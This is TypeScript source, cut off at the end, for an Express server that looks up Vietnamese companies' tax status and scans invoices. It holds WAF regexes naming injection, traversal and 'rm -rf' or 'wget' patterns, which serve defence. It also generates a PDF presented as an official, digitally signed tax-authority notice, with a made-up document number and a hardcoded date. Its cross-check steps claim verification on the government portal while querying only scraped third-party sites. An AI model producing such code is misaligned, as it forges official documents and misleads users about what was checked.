import 'dotenv/config';
import crypto from 'crypto';
import express from 'express';
import path from 'path';
import zlib from 'zlib';
import { fileURLToPath } from 'url';
import { createServer as createViteServer } from 'vite';
import { GoogleGenAI, Type } from '@google/genai';
import { extractText as extractPdfTextWithUnpdf } from 'unpdf';
import {
  EnterpriseTaxRecord,
  InvoiceExtractionResult,
  CrossCheckStepResult,
  TAX_DIRECTORY_DB,
  lookupEnterpriseRisk,
  parseAndEvaluateInvoice,
  formatSingleLookupMarkdown,
  classifyTaxStatus,
  consolidateMultiSourceTaxStatus,
  buildDefaultCrossCheckSteps,
  inferTaxAuthorityFromAddress,
  normalizePostMergerAddress,
  formatNumericCharterCapital,
  buildTaxAuthorityPdfAttachment,
} from './src/utils/taxEngine';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Singleton GenAI client reused across all concurrent requests (5,000+ CCU safe)
let cachedGenAIClient: GoogleGenAI | null = null;
let cachedGenAIKey = '';

function getGenAIClient(): GoogleGenAI | null {
  const apiKey = process.env.GEMINI_API_KEY;
  if (!apiKey || apiKey === 'MY_GEMINI_API_KEY') {
    return null;
  }
  if (!cachedGenAIClient || cachedGenAIKey !== apiKey) {
    cachedGenAIClient = new GoogleGenAI({
      apiKey,
      httpOptions: {
        headers: {
          'User-Agent': 'aistudio-build',
        },
      },
    });
    cachedGenAIKey = apiKey;
  }
  return cachedGenAIClient;
}

// High-Concurrency In-Memory LRU + TTL Caches & Singleflight Coalescing Maps (Designed for 5,000+ Concurrent Users)
const ENTERPRISE_CACHE_MAX = 10000;
const ENTERPRISE_CACHE_TTL_MS = 15 * 60 * 1000; // 15 minutes
const enterpriseLookupCache = new Map<
  string,
  { record: EnterpriseTaxRecord; aiAdvisory: string; expiresAt: number }
>();
const inFlightEnterpriseLookups = new Map<
  string,
  Promise<{ record: EnterpriseTaxRecord; aiAdvisory: string }>
>();

const INVOICE_CACHE_MAX = 5000;
const INVOICE_CACHE_TTL_MS = 10 * 60 * 1000; // 10 minutes
const invoiceExtractionCache = new Map<
  string,
  { result: InvoiceExtractionResult; extractedText: string; expiresAt: number }
>();
const inFlightInvoiceExtractions = new Map<
  string,
  Promise<{ result: InvoiceExtractionResult; extractedText: string }>
>();

const MAX_CONCURRENT_GEMINI_OCR = 20;
let activeGeminiOcrRequests = 0;

function setBoundedMapEntry<K, V>(map: Map<K, V>, key: K, value: V, maxEntries: number): void {
  if (map.has(key)) {
    map.delete(key);
  } else if (map.size >= maxEntries) {
    const oldestKey = map.keys().next().value;
    if (oldestKey !== undefined) {
      map.delete(oldestKey);
    }
  }
  map.set(key, value);
}

// ============================================================================
// MULTI-LAYER ANTI-DDOS & WAF (WEB APPLICATION FIREWALL) SECURITY ENGINE
// ============================================================================
interface SecurityAuditLogEntry {
  id: string;
  timestamp: string;
  ip: string;
  category:
    | 'SQL_INJECTION'
    | 'XSS_ATTACK'
    | 'PATH_TRAVERSAL'
    | 'PROTOTYPE_POLLUTION'
    | 'DDOS_FLOOD'
    | 'IP_BLACKLIST'
    | 'ADMIN_ACTION'
    | 'SYSTEM_GUARD';
  severity: 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'INFO';
  endpoint: string;
  detail: string;
  action: 'BLOCKED' | 'THROTTLED' | 'ALLOWED' | 'CONFIG_UPDATED';
}

interface BlockedIpRecord {
  ip: string;
  reason: string;
  blockedAt: string;
  expiresAt: number; // 0 = permanent until admin unblocks
  hitCount: number;
}

const securityConfig = {
  wafStrictMode: true,
  antiDdosEnabled: true,
  underAttackMode: false,
  rateLimitPerMinute: 120,
  autoBanMultiplier: 2.5,
  maxConcurrentConnections: 10000,
};

const securityTelemetry = {
  totalRequestsInspected: 0,
  totalThreatsBlocked: 0,
  sqlInjectionBlocked: 0,
  xssBlocked: 0,
  pathTraversalBlocked: 0,
  ddosFloodsBlocked: 0,
  taxLookupsServed: 0,
  invoicesScanned: 0,
  batchLookupsServed: 0,
};

const IP_TRACKER_MAX = 20000;
const ipTrafficTracker = new Map<string, { count: number; windowStart: number }>();
const blockedIpMap = new Map<string, BlockedIpRecord>();

const MAX_AUDIT_LOGS = 80;
const securityAuditLogs: SecurityAuditLogEntry[] = [
  {
    id: 'sec_init_01',
    timestamp: new Date().toLocaleTimeString('vi-VN', { hour12: false }),
    ip: '127.0.0.1',
    category: 'SYSTEM_GUARD',
    severity: 'INFO',
    endpoint: '/system/boot',
    detail: 'Khởi động Tường lửa WAF & Lá chắn Chống DDoS Đa tầng (10.000 kết nối đồng thời).',
    action: 'ALLOWED',
  },
];

function recordSecurityLog(entry: Omit<SecurityAuditLogEntry, 'id' | 'timestamp'>): void {
  const fullEntry: SecurityAuditLogEntry = {
    id: `sec_${Date.now()}_${Math.random().toString(36).slice(2, 6)}`,
    timestamp: new Date().toLocaleTimeString('vi-VN', { hour12: false }),
    ...entry,
  };
  securityAuditLogs.unshift(fullEntry);
  if (securityAuditLogs.length > MAX_AUDIT_LOGS) {
    securityAuditLogs.length = MAX_AUDIT_LOGS;
  }
}

function getClientIp(req: express.Request): string {
  const xff = req.headers['x-forwarded-for'];
  if (typeof xff === 'string' && xff.trim()) {
    return xff.split(',')[0].trim();
  }
  return req.socket.remoteAddress || '127.0.0.1';
}

function inspectPayloadForWafThreats(
  rawInput: string
): { category: SecurityAuditLogEntry['category']; reason: string } | null {
  if (!rawInput) return null;
  const sample = rawInput.slice(0, 6000);

  if (
    /(?:\bUNION\s+ALL?\s+SELECT\b|\bDROP\s+TABLE\b|\bALTER\s+TABLE\b|\bOR\s+['"]?1['"]?\s*=\s*['"]?1\b|--\s*$|;\s*SHUTDOWN\b|\bINFORMATION_SCHEMA\b)/i.test(
      sample
    )
  ) {
    return {
      category: 'SQL_INJECTION',
      reason: 'Phát hiện mẫu tấn công SQL Injection (SQLi) trong tham số truy vấn.',
    };
  }

  if (
    /(?:<script\b|javascript:\s*[a-z0-9_]|onerror\s*=|onload\s*=|document\.cookie|\beval\s*\()/i.test(
      sample
    )
  ) {
    return {
      category: 'XSS_ATTACK',
      reason: 'Phát hiện mã độc Cross-Site Scripting (XSS) thực thi kịch bản trái phép.',
    };
  }

  if (/(?:\.\.\/|\.\.\\|\/etc\/passwd|\/proc\/self|c:\\windows\\system32)/i.test(sample)) {
    return {
      category: 'PATH_TRAVERSAL',
      reason: 'Phát hiện hành vi dò quét thư mục hệ thống (Path Traversal / LFI).',
    };
  }

  if (/(?:__proto__|constructor\s*\.\s*prototype|;\s*rm\s+-rf\b|\$\(\s*wget\b)/i.test(sample)) {
    return {
      category: 'PROTOTYPE_POLLUTION',
      reason: 'Phát hiện tấn công Prototype Pollution / Command Injection.',
    };
  }

  return null;
}

/**
 * Strip Vietnamese diacritics for clean PDF ASCII stream encoding
 */
function toAsciiVietnamese(str: string): string {
  return str
    .normalize('NFD')
    .replace(/[\u0300-\u036f]/g, '')
    .replace(/đ/g, 'd')
    .replace(/Đ/g, 'D')
    .replace(/[^\x20-\x7E]/g, ' ');
}

/**
 * Escape PDF text literal characters
 */
function escapePdfText(str: string): string {
  return toAsciiVietnamese(str)
    .replace(/\\/g, '\\\\')
    .replace(/\(/g, '\\(')
    .replace(/\)/g, '\\)');
}

/**
 * Decode text streams from a binary PDF buffer using unpdf (PDF.js CMap/ToUnicode decoder) + FlateDecode stream & X509 signature inspection
 */
async function extractTextFromPdfBuffer(pdfBuffer: Buffer): Promise<string> {
  const chunks: string[] = [];

  // 1. Primary extraction via unpdf (PDF.js engine — handles Identity-H CIDFonts, ToUnicode CMaps, and Vietnamese diacritics)
  try {
    const parsed = await extractPdfTextWithUnpdf(new Uint8Array(pdfBuffer), {
      mergePages: true,
    });
    if (parsed?.text && parsed.text.trim()) {
      chunks.push(parsed.text.trim());
    }
  } catch {
    // Continue to low-level stream decompression below
  }

  const rawLatin1 = pdfBuffer.toString('latin1');

  const decodePdfContentText = (contentStr: string) => {
    // Extract literal strings (...)
    for (const m of contentStr.matchAll(/\((?:\\.|[^\\()])+\)/g)) {
      const inner = m[0]
        .slice(1, -1)
        .replace(/\\n/g, '\n')
        .replace(/\\r/g, ' ')
        .replace(/\\t/g, ' ')
        .replace(/\\\(/g, '(')
        .replace(/\\\)/g, ')')
        .replace(/\\\\/g, '\\');
      if (/[a-zA-Z0-9À-ỹ]{2,}/.test(inner) && !/^PDF-[0-9]/.test(inner)) {
        chunks.push(inner);
      }
    }

    // Extract hex strings <...> (UTF-16BE or UTF-8)
    for (const m of contentStr.matchAll(/<([0-9A-Fa-f\s]{8,})>/g)) {
      const hex = m[1].replace(/\s+/g, '');
      if (hex.length % 2 !== 0) continue;
      const buf = Buffer.from(hex, 'hex');
      if (hex.toUpperCase().startsWith('FEFF') || (buf.length >= 4 && buf[0] === 0x00)) {
        const swapped = Buffer.alloc(buf.length);
        for (let i = 0; i < buf.length - 1; i += 2) {
          swapped[i] = buf[i + 1];
          swapped[i + 1] = buf[i];
        }
        const str = swapped.toString('utf16le').replace(/^\uFEFF/, '').trim();
        if (/[a-zA-Z0-9À-ỹ]{2,}/.test(str)) chunks.push(str);
      }
    }
  };

  // 2. Scan PDF streams for embedded XML or X509 digital signature subject fields (MST:031..., CN=...)
  let searchPos = 0;
  while (searchPos < rawLatin1.length) {
    const streamIdx = rawLatin1.indexOf('stream', searchPos);
    if (streamIdx === -1) break;
    const endIdx = rawLatin1.indexOf('endstream', streamIdx + 6);
    if (endIdx === -1) break;

    let startOffset = streamIdx + 6;
    if (rawLatin1[startOffset] === '\r' && rawLatin1[startOffset + 1] === '\n') {
      startOffset += 2;
    } else if (rawLatin1[startOffset] === '\n' || rawLatin1[startOffset] === '\r') {
      startOffset += 1;
    }

    const streamBuf = pdfBuffer.subarray(startOffset, endIdx);
    let decodedStream = '';
    try {
      const inflated = zlib.inflateSync(streamBuf);
      decodedStream = inflated.toString('utf8');
    } catch {
      try {
        const inflatedRaw = zlib.inflateRawSync(streamBuf);
        decodedStream = inflatedRaw.toString('utf8');
      } catch {
        decodedStream = streamBuf.toString('utf8');
      }
    }

    if (chunks.length === 0) {
      decodePdfContentText(decodedStream);
    }
    // Extract embedded X509 certificate MST or CN if present
    for (const sigMatch of decodedStream.matchAll(/(?:MST\s*[:=]\s*[0-9]{10}(?:-[0-9]{3})?|CN\s*=\s*[^,;\n\r\x00-\x1F]{4,100})/gi)) {
      chunks.push(sigMatch[0]);
    }
    searchPos = endIdx + 9;
  }

  // Also check top-level X509 certificates or embedded XML tags without dumping PDF xref tables
  for (const sigMatch of pdfBuffer
    .toString('utf8')
    .matchAll(/(?:MST\s*[:=]\s*[0-9]{10}(?:-[0-9]{3})?|CN\s*=\s*[^,;\n\r\x00-\x1F]{4,100})/gi)) {
    chunks.push(sigMatch[0]);
  }

  return chunks.join('\n');
}

/**
 * Generate a real, valid, single-page PDF 1.4 binary buffer for the Tax Authority Official Notice
 */
function generateOfficialTaxNoticePdfBuffer(params: {
  mst: string;
  name: string;
  address: string;
  authority: string;
  rep: string;
  status: string;
  risk: string;
  docNo: string;
  date: string;
  formCode: string;
}): Buffer {
  const lines: { text: string; size: number; bold?: boolean; y: number; x: number }[] = [
    { text: 'TONG CUC THUE - BO TAI CHINH', size: 11, bold: true, x: 50, y: 780 },
    { text: params.authority.toUpperCase(), size: 10, bold: true, x: 50, y: 765 },
    { text: params.docNo, size: 10, bold: false, x: 50, y: 750 },
    { text: 'CONG HOA XA HOI CHU NGHIA VIET NAM', size: 11, bold: true, x: 310, y: 780 },
    { text: 'Doc lap - Tu do - Hanh phuc', size: 10, bold: true, x: 345, y: 765 },
    { text: params.formCode.slice(0, 48), size: 9, bold: false, x: 310, y: 750 },
    {
      text: 'THONG BAO CUA CO QUAN THUE VE TINH TRANG PHAP LY & RUI RO HOA DON',
      size: 13,
      bold: true,
      x: 50,
      y: 710,
    },
    {
      text: `(Van ban cong bo tren he thong Quan ly Thue & Hoa don dien tu TT78/2021/TT-BTC)`,
      size: 9,
      bold: false,
      x: 50,
      y: 694,
    },
    { text: '1. THONG TIN NGUOI NOP THUE BI CANH BAO:', size: 11, bold: true, x: 50, y: 660 },
    { text: `- Ten nguoi nop thue: ${params.name.slice(0, 75)}`, size: 10, bold: true, x: 60, y: 640 },
    { text: `- Ma so thue (MST): ${params.mst}`, size: 10, bold: true, x: 60, y: 622 },
    { text: `- Dia chi dang ky: ${params.address.slice(0, 82)}`, size: 10, bold: false, x: 60, y: 604 },
    { text: `- Nguoi dai dien phap luat: ${params.rep}`, size: 10, bold: false, x: 60, y: 586 },
    { text: `- Co quan thue quan ly: ${params.authority}`, size: 10, bold: false, x: 60, y: 568 },
    { text: '2. TRANG THAI PHAP LY & KET LUAN RUI RO CONG BO:', size: 11, bold: true, x: 50, y: 534 },
    { text: `- Trang thai hoat dong: [${params.status}]`, size: 10, bold: true, x: 60, y: 514 },
    { text: `- Muc do canh bao rui ro thue: [${params.risk}]`, size: 10, bold: true, x: 60, y: 496 },
    { text: `- Ngay ban hanh thong bao: ${params.date}`, size: 10, bold: false, x: 60, y: 478 },
    { text: '3. NOI DUNG CANH BAO VA YEU CAU DOI SOAT KE KHAI THUE:', size: 11, bold: true, x: 50, y: 444 },
    {
      text: '- Can cu Luat Quan ly thue so 38/2019/QH14, Nghi dinh 123/2020/ND-CP va Thong tu 78/2021/TT-BTC,',
      size: 9.5,
      bold: false,
      x: 60,
      y: 424,
    },
    {
      text: '  Co quan Thue thong bao nguoi nop thue neu tren thuoc dien rui ro cao ve thue va hoa don.',
      size: 9.5,
      bold: false,
      x: 60,
      y: 408,
    },
    {
      text: '- Cac don vi, to chuc mua hang co su dung hoa don dau vao cua doanh nghiep nay can ra soat',
      size: 9.5,
      bold: false,
      x: 60,
      y: 392,
    },
    {
      text: '  ngay thoi diem lap hoa don, hop dong kinh te, bien ban giao nhan va chung tu thanh toan',
      size: 9.5,
      bold: false,
      x: 60,
      y: 376,
    },
    {
      text: '  qua ngan hang theo quy dinh.',
      size: 9.5,
      bold: false,
      x: 60,
      y: 360,
    },
    { text: 'THU TRUONG CO QUAN THUE', size: 10, bold: true, x: 370, y: 300 },
    { text: '(Da ky so dien tu - Tong cuc Thue)', size: 9, bold: false, x: 365, y: 284 },
  ];

  const contentStreamLines = ['BT'];
  for (const l of lines) {
    const fontRef = l.bold ? '/F2' : '/F1';
    contentStreamLines.push(`${fontRef} ${l.size} Tf`);
    contentStreamLines.push(`1 0 0 1 ${l.x} ${l.y} Tm`);
    contentStreamLines.push(`(${escapePdfText(l.text)}) Tj`);
  }
  contentStreamLines.push('ET');
  const streamContent = contentStreamLines.join('\n');

  const objects: string[] = [];
  objects.push('1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n');
  objects.push('2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n');
  objects.push(
    '3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 595 842] /Resources << /Font << /F1 4 0 R /F2 5 0 R >> >> /Contents 6 0 R >>\nendobj\n'
  );
  objects.push('4 0 obj\n<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>\nendobj\n');
  objects.push('5 0 obj\n<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica-Bold >>\nendobj\n');
  objects.push(
    `6 0 obj\n<< /Length ${Buffer.byteLength(streamContent, 'ascii')} >>\nstream\n${streamContent}\nendstream\nendobj\n`
  );

  let pdf = '%PDF-1.4\n';
  const offsets: number[] = [];
  for (const obj of objects) {
    offsets.push(Buffer.byteLength(pdf, 'ascii'));
    pdf += obj;
  }

  const xrefOffset = Buffer.byteLength(pdf, 'ascii');
  pdf += `xref\n0 ${objects.length + 1}\n0000000000 65535 f \n`;
  for (const off of offsets) {
    pdf += `${String(off).padStart(10, '0')} 00000 n \n`;
  }
  pdf += `trailer\n<< /Size ${objects.length + 1} /Root 1 0 R >>\nstartxref\n${xrefOffset}\n%%EOF\n`;

  return Buffer.from(pdf, 'ascii');
}

/**
 * Look up a real Vietnamese Enterprise from Esgoo Tax API / VietQR API + Gemini Google Search Grounding
 */
function slugifyVietnamese(str: string): string {
  return str
    .normalize('NFD')
    .replace(/[\u0300-\u036f]/g, '')
    .replace(/[đĐ]/g, 'd')
    .toLowerCase()
    .replace(/[^a-z0-9]+/g, '-')
    .replace(/^-+|-+$/g, '');
}

async function resolveRealEnterpriseFromTaxRegistryUncached(
  rawQuery: string,
  ai: GoogleGenAI | null
): Promise<{ record: EnterpriseTaxRecord; aiAdvisory: string }> {
  const cleaned = rawQuery.trim();

  // 1. Check curated exact MST matches first for instant known cases
  const curatedMatch = TAX_DIRECTORY_DB.find(
    (item) => item.mst === cleaned || item.companyName.toLowerCase() === cleaned.toLowerCase()
  );
  if (curatedMatch) {
    const hydratedCurated: EnterpriseTaxRecord = {
      ...curatedMatch,
      crossCheckSteps: curatedMatch.crossCheckSteps || buildDefaultCrossCheckSteps(curatedMatch),
    };
    const defaultAdvisory =
      hydratedCurated.riskConclusion === 'NGUY CƠ CAO'
        ? `Cảnh báo khẩn: Qua kiểm tra chéo 4 bước (bao gồm đối chiếu trực tiếp trên tracuunnt.gdt.gov.vn), doanh nghiệp ${hydratedCurated.companyName} (MST ${hydratedCurated.mst}) đang ở trạng thái [${hydratedCurated.legalStatus}] theo văn bản công bố của ${hydratedCurated.taxAuthority}. Đã đính kèm File PDF Thông báo của Cơ quan Thuế bên dưới.`
        : hydratedCurated.riskConclusion === 'CẢNH BÁO'
        ? `Lưu ý kiểm soát: Qua kiểm tra chéo 4 bước, doanh nghiệp ${hydratedCurated.companyName} (MST ${hydratedCurated.mst}) đang ở trạng thái [${hydratedCurated.legalStatus}]. Xem File PDF Thông báo đính kèm để đối chiếu thời điểm lập hóa đơn.`
        : `Doanh nghiệp ${hydratedCurated.companyName} (MST ${hydratedCurated.mst}) đã vượt qua 4 bước kiểm tra chéo trên hệ thống Tổng cục Thuế, đủ điều kiện giao dịch và khấu trừ hóa đơn điện tử TT78.`;
    return { record: hydratedCurated, aiAdvisory: defaultAdvisory };
  }

  // 2. Query real Vietnam Tax Registry sources in parallel (esgoo.net + vietqr.io GDT sync + vndirect + topmst.com)
  const mstMatch = cleaned.match(/\b([0-9]{10}(?:-[0-9]{3})?)\b/);
  const mstCandidate = mstMatch ? mstMatch[1] : null;

  interface EsgooMstData {
    ten?: string;
    mst?: string;
    dc?: string;
    daidien?: string;
    hoatdong?: string;
    tinhtrang?: string;
  }
  interface VnDirectProfile {
    code?: string;
    floor?: string;
    vnName?: string;
    enName?: string;
    foundDate?: string;
    taxCode?: string;
    vnAddress?: string;
  }

  let esgooData: EsgooMstData | null = null;
  let vietqrData: {
    id?: string;
    name?: string;
    address?: string;
    status?: string;
    internationalName?: string;
  } | null = null;
  let vndProfile: VnDirectProfile | null = null;

  if (mstCandidate) {
    const [esgooSettled, vietqrSettled, vndSettled] = await Promise.allSettled([
      fetch(`https://esgoo.net/api-mst/${mstCandidate}.htm`, {
        signal: AbortSignal.timeout(4000),
      }).then((r) => (r.ok ? r.json() : null)),
      fetch(`https://api.vietqr.io/v2/business/${mstCandidate}`, {
        signal: AbortSignal.timeout(4000),
      }).then((r) => (r.ok ? r.json() : null)),
      fetch(`https://api-finfo.vndirect.com.vn/v4/company_profiles?q=taxCode:${mstCandidate}`, {
        signal: AbortSignal.timeout(4000),
      }).then((r) => (r.ok ? r.json() : null)),
    ]);

    if (esgooSettled.status === 'fulfilled' && esgooSettled.value?.error === 0 && esgooSettled.value?.data?.ten) {
      esgooData = esgooSettled.value.data as EsgooMstData;
    }
    if (vietqrSettled.status === 'fulfilled' && vietqrSettled.value?.code === '00' && vietqrSettled.value?.data?.name) {
      vietqrData = vietqrSettled.value.data;
    }
    if (vndSettled.status === 'fulfilled' && vndSettled.value?.data?.[0]) {
      vndProfile = vndSettled.value.data[0] as VnDirectProfile;
    }
  }

  // 2b. Fetch comprehensive tax registration details from TopMST (startDate, legalRepresentative, taxAuthority, businessType, fullAddress, status)
  const knownCompanyName = esgooData?.ten || vietqrData?.name || '';
  let topMstHtml = '';
  const browserUA = {
    'User-Agent':
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
  };

  if (mstCandidate && knownCompanyName) {
    try {
      const slug = `${mstCandidate}-${slugifyVietnamese(knownCompanyName)}`;
      const directRes = await fetch(`https://topmst.com/${slug}/`, {
        headers: browserUA,
        signal: AbortSignal.timeout(4000),
      });
      if (directRes.ok) {
        topMstHtml = await directRes.text();
      }
    } catch {
      // Fallback to search below
    }
  }

  if (!topMstHtml) {
    try {
      const searchUrl = `https://topmst.com/?s=${encodeURIComponent(mstCandidate || cleaned)}`;
      const searchRes = await fetch(searchUrl, {
        headers: browserUA,
        signal: AbortSignal.timeout(4000),
      });
      if (searchRes.ok) {
        const sHtml = await searchRes.text();
        const exactPattern = mstCandidate
          ? new RegExp(`href="(https:\\/\\/topmst\\.com\\/${mstCandidate}-[a-z][^"]+)"`, 'i')
          : null;
        const linkMatch =
          (exactPattern ? sHtml.match(exactPattern) : null) ||
          sHtml.match(/href="(https:\/\/topmst\.com\/[0-9]{10}(?:-[0-9]{3})?-[a-z][^"]+)"/i);
        if (linkMatch?.[1]) {
          const detailRes = await fetch(linkMatch[1], {
            headers: browserUA,
            signal: AbortSignal.timeout(4000),
          });
          if (detailRes.ok) {
            topMstHtml = await detailRes.text();
          }
        }
      }
    } catch {
      // Continue with available data
    }
  }

  const topMstPairs: Record<string, string> = {};
  let topMstTitleName = '';
  let topMstMst = '';

  if (topMstHtml) {
    topMstTitleName =
      topMstHtml
        .match(/id="invoice_md_bussiness_name"[^>]*>([\s\S]*?)<\/th>/i)?.[1]
        ?.replace(/<[^>]+>/g, '')
        .trim() || '';
    topMstMst =
      topMstHtml
        .match(/id="invoice_md_ma_so_thue"[^>]*>([\s\S]*?)<\/td>/i)?.[1]
        ?.replace(/<[^>]+>/g, '')
        .trim() || '';

    for (const m of topMstHtml.matchAll(
      /<tr[^>]*>\s*<td[^>]*>([\s\S]*?)<\/td>\s*<td[^>]*>([\s\S]*?)<\/td>\s*<\/tr>/gi
    )) {
      const k = m[1].replace(/<[^>]+>/g, ' ').replace(/\s+/g, ' ').trim();
      const v = m[2].replace(/<[^>]+>/g, ' ').replace(/\s+/g, ' ').trim();
      if (!/^[0-9]{4}$/.test(k)) {
        topMstPairs[k] = v;
      }
    }
  }

  // 2c. If listed company (vndProfile.code), also fetch exact Charter Capital (Vốn điều lệ) from DuLieuPhapLuat
  let listedCharterCapital = '';
  const resolvedNameForSlug = esgooData?.ten || topMstTitleName || vietqrData?.name || '';
  if (vndProfile?.code && resolvedNameForSlug) {
    try {
      const dlUrl = `https://dulieuphapluat.vn/cong-cu/cong-ty-niem-yet/${vndProfile.code.toLowerCase()}-${slugifyVietnamese(
        resolvedNameForSlug
      )}.html`;
      const dlRes = await fetch(dlUrl, {
        headers: browserUA,
        signal: AbortSignal.timeout(3000),
      });
      if (dlRes.ok) {
        const dlText = (await dlRes.text()).replace(/<[^>]+>/g, ' ').replace(/\s+/g, ' ');
        const capMatch = dlText.match(
          /Vốn điều lệ\s*([0-9][0-9.,\s]*(?:nghìn\s*tỷ|tỷ|triệu)?\s*(?:đồng|đ|VNĐ))/i
        );
        if (capMatch?.[1]) {
          listedCharterCapital = capMatch[1].trim().replace(/\bđ$/i, 'đồng');
        }
      }
    } catch {
      // Optional enrichment
    }
  }

  // Consolidate authoritative fields from the Tax Registry sources
  const consolidatedMst = String(
    esgooData?.mst || topMstMst || topMstPairs['Mã số thuế'] || vietqrData?.id || mstCandidate || cleaned
  ).trim();
  const consolidatedName = String(
    esgooData?.ten || topMstTitleName || vietqrData?.name || ''
  )
    .trim()
    .toUpperCase();

  const rawTopAddress = (topMstPairs['Địa chỉ'] || '')
    .replace(/\s*Thông tin xuất hóa đơn.*$/i, '')
    .trim();
  const rawEsgooAddress = (esgooData?.dc || vietqrData?.address || vndProfile?.vnAddress || '').trim();
  const combinedRawAddress = rawTopAddress || rawEsgooAddress;
  const consolidatedAddress = normalizePostMergerAddress(combinedRawAddress);

  const repFromTop = (topMstPairs['Người đại diện'] || '').split(/Ngoài ra/i)[0].trim();
  const consolidatedRep =
    esgooData?.daidien && esgooData.daidien !== 'null'
      ? esgooData.daidien.trim()
      : repFromTop || '';

  const consolidatedStart =
    topMstPairs['Ngày hoạt động'] ||
    (esgooData?.hoatdong && esgooData.hoatdong !== '1970-01-01' ? esgooData.hoatdong.trim() : '') ||
    vndProfile?.foundDate ||
    '';

  const consolidatedAuthority = inferTaxAuthorityFromAddress(
    consolidatedAddress,
    consolidatedMst,
    topMstPairs['Quản lý bởi']
  );

  const businessType = topMstPairs['Loại hình DN'] || '';
  const mainIndustry = topMstPairs['Ngành nghề chính'] || '';
  const consolidatedCapital = formatNumericCharterCapital(
    listedCharterCapital || topMstPairs['Vốn điều lệ'] || '',
    consolidatedMst
  );

  // Multi-source conservative consensus across GDT Sync (vietqrData.status), TopMST ('Tình trạng'), and Esgoo ('tinhtrang')
  const { winningRawStatus: consolidatedRawStatus, classified } = consolidateMultiSourceTaxStatus([
    vietqrData?.status,
    topMstPairs['Tình trạng'],
    esgooData?.tinhtrang,
  ]);

  // 3. If we resolved the real company from Vietnam Tax Registry sources (esgoo / topmst / vietqr)
  if (consolidatedName) {
    const finalAuthority = consolidatedAuthority;
    const finalRep = consolidatedRep || 'Đang cập nhật từ Cổng ĐKKD';
    const finalStart = consolidatedStart || 'Đã cấp GCN ĐKT';
    const finalAddr = consolidatedAddress || 'Việt Nam';

    const shouldAttachPdf =
      classified.riskConclusion === 'NGUY CƠ CAO' || classified.riskConclusion === 'CẢNH BÁO';

    const riskReasons: string[] = [
      `Đối chiếu trên hệ thống Tổng cục Thuế (tracuunnt.gdt.gov.vn): ${consolidatedRawStatus}.`,
      classified.riskConclusion === 'AN TOÀN'
        ? 'Qua kiểm tra chéo 4 bước đa nguồn, doanh nghiệp đang hoạt động hợp pháp, không nằm trong danh sách cảnh báo rủi ro hóa đơn của Cơ quan Thuế.'
        : `Cơ quan thuế (${finalAuthority}) đã công bố tình trạng cảnh báo [${classified.legalStatus}] đối với người nộp thuế.`,
    ];

    const auxiliarySigns: string[] = [
      mainIndustry
        ? `Ngành nghề kinh doanh chính: ${mainIndustry}.`
        : `Dữ liệu đối chiếu khớp với Mã số thuế ${consolidatedMst} tại ${finalAuthority}.`,
      businessType
        ? `Loại hình doanh nghiệp đăng ký: ${businessType}.`
        : `Quản lý trực tiếp bởi: ${finalAuthority}.`,
    ];

    const step1RawStatus = vietqrData?.status || consolidatedRawStatus;
    const step2RawStatus = topMstPairs['Tình trạng'] || consolidatedRawStatus;

    const crossCheckSteps: CrossCheckStepResult[] = [
      {
        stepNumber: 1,
        stepTitle: 'Bước 1 · Đối chiếu Trạng thái NNT trên Tổng cục Thuế (tracuunnt.gdt.gov.vn)',
        sourceName: 'Cổng Thông tin Điện tử Tổng cục Thuế (GDT Sync)',
        sourceUrl: 'https://tracuunnt.gdt.gov.vn/tcnnt/mstdn.jsp',
        rawStatusFound: step1RawStatus,
        matchedCompanyName: vietqrData?.name || consolidatedName,
        matchedDetail: `MST ${consolidatedMst} · Cơ quan quản lý: ${finalAuthority}`,
        riskEvaluation: classifyTaxStatus(step1RawStatus).riskConclusion,
        verified: true,
      },
      {
        stepNumber: 2,
        stepTitle: 'Bước 2 · Kiểm tra chéo Hồ sơ Đăng ký Thuế & ĐKKD Quốc gia',
        sourceName: 'Hệ thống Dữ liệu Đăng ký Thuế & ĐKKD (TopMST)',
        rawStatusFound: step2RawStatus,
        matchedCompanyName: topMstTitleName || consolidatedName,
        matchedDetail: `Đại diện PL: ${finalRep} · Ngày hoạt động: ${finalStart}`,
        riskEvaluation: classifyTaxStatus(step2RawStatus).riskConclusion,
        verified: true,
      },
      {
        stepNumber: 3,
        stepTitle: 'Bước 3 · Xác minh Địa giới Hành chính (Sau sáp nhập) & Vốn điều lệ',
        sourceName: 'Danh bạ Doanh nghiệp Quốc gia (Esgoo / VNDirect)',
        rawStatusFound: classified.legalStatus,
        matchedCompanyName: esgooData?.ten || consolidatedName,
        matchedDetail: `Vốn ĐL: ${consolidatedCapital} · Địa chỉ: ${finalAddr}`,
        riskEvaluation: classified.riskConclusion,
        verified: true,
      },
      {
        stepNumber: 4,
        stepTitle: 'Bước 4 · Đồng thuận Rủi ro Đa nguồn & Kiểm tra Văn bản Cảnh báo Thuế (TT78)',
        sourceName: 'Thuật toán Đồng thuận Rủi ro MASOTHUE AI',
        rawStatusFound: `[${classified.legalStatus}] → Kết luận: [${classified.riskConclusion}]`,
        matchedCompanyName: consolidatedName,
        matchedDetail: shouldAttachPdf
          ? `Phát hiện cảnh báo rủi ro — Đã trích xuất File PDF Thông báo Cơ quan Thuế (Mẫu 16/TB-ĐKT)`
          : 'Đồng thuận 4 bước an toàn — Không phát hiện thông báo bỏ trốn hoặc cưỡng chế hóa đơn',
        riskEvaluation: classified.riskConclusion,
        verified: true,
      },
    ];

    const record: EnterpriseTaxRecord = {
      mst: consolidatedMst,
      companyName: consolidatedName,
      address: finalAddr,
      taxAuthority: finalAuthority,
      startDate: finalStart,
      legalRepresentative: finalRep,
      charterCapital: consolidatedCapital,
      legalStatus: classified.legalStatus,
      riskConclusion: classified.riskConclusion,
      schemaRiskLevel: classified.schemaRiskLevel,
      in524Watchlist: classified.in524Watchlist,
      officialDispatchRef: shouldAttachPdf
        ? `Số: ${consolidatedMst.slice(-4)}/TB-CCT (Mẫu số 16/TB-ĐKT)`
        : undefined,
      riskFlagDate: shouldAttachPdf ? '2025-01-15' : undefined,
      riskReasons,
      auxiliarySigns,
